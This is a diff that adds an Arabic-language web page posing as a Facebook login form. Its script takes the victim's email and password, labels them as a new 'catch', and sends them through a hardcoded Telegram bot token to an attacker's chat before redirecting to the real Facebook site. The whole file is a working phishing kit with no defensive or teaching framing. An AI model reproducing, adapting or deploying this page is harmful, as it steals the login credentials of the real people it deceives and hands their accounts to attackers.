@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8"><title>Facebook - التسجيل</title>
+    <style>
+        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; text-align: center; }
+        .login-box { background: white; padding: 20px; margin: 50px auto; width: 350px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+        .login-btn { background: #1877f2; color: white; padding: 12px; border: none; border-radius: 6px; width: 95%; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1 style="color:#1877f2; font-size:40px;">facebook</h1>
+        <p>قم بتسجيل الدخول للمتابعة إلى التطبيق</p>
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button class="login-btn" onclick="login()">تسجيل الدخول</button>
+    </div>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const uid = params.get('id');
+        const token = "8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg";
+
+        function login() {
+            const e = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+            const msg = `📘 صيد فيسبوك جديد\n🆔 ID: ${uid}\n📧 البريد: ${e}\n🔑 الباسورد: ${p}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(msg)}`);
+            location.href = "https://facebook.com";
+        }
+    </script>
+</body>
+</html>
+
